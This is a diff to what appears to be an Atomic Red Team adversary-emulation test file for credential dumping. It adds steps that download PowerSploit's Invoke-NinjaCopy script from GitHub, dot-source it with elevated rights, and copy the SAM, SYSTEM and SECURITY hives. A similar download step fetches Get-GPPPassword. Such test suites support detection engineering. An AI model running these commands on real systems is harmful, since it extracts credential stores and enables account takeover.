@@ -241,11 +241,11 @@ atomic_tests:
       - description: |
           Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
         prereq_command: |
-          if(Test-Path #{gpp_script_path}) { 0 } else { 1 }
+          if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
         get_prereq_command: |
-          $path = Split-Path #{gpp_script_path}
-          if(-not (Test-Path $path)){ New-Item -ItemType Directory -Path $path }
-          Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
+          $path = Split-Path "#{gpp_script_path}"
+          if(-not (Test-Path "$path")){ New-Item -ItemType Directory -Path "$path" }
+          Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
 
     executor:
       name: powershell
@@ -263,6 +263,14 @@ atomic_tests:
       - windows
 
     input_arguments:
+      ninjacopy_script_path:
+        description: Path to the Invoke-NinjaCopy PowerShell script
+        type: Path
+        default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+      ninjacopy_script_url:
+        description: URL of the Invoke-NinjaCopy PowerShell Script
+        type: URL
+        default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
       sam_binary_path:
         description: Path of the SAM file
         type: string
@@ -280,11 +288,22 @@ atomic_tests:
         type: Path
         default: C:\Windows\Temp
 
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}
+        prereq_command: |
+          if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
+        get_prereq_command: |
+          $path = Split-Path "#{ninjacopy_script_path}"
+          if(-not (Test-Path "$path")){ New-Item -ItemType Directory -Path "$path" }
+          Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
+
     executor:
       name: powershell
       elevation_required: true
       command: |
-        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+        . #{ninjacopy_script_path}
         Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
         Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
         Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
